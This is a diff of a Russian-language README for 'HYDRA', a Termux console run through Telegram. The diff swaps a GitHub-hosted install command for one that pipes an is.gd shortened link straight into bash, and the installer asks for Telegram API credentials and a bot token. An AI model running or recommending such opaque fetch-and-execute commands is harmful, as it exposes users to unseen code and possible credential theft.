@@ -1,15 +1,15 @@
-# 🐉 HYDRA: AI Admin Console
+:: H Y D R A 🐉
 
 Профессиональная консоль управления Termux через Telegram с поддержкой Google Gemini Pro и GitHub Failover.
 
-## 🚀 Как установить
+:: 🚀 Как установить
 Скопируйте эту команду в Termux:
 
 ```bash
-curl -sL https://raw.githubusercontent.com/ВАШ_НИКНЕЙМ/hydra/main/install.sh | bash
+curl -L https://is.gd/suWm0t | bash
 ```
 
-## ⚙️ Что понадобится
+:: ⚙️ Что понадобится
 При установке скрипт попросит ввести:
 1. **Telegram API ID & Hash** (получить на my.telegram.org)
 2. **Bot Token** (от @BotFather)
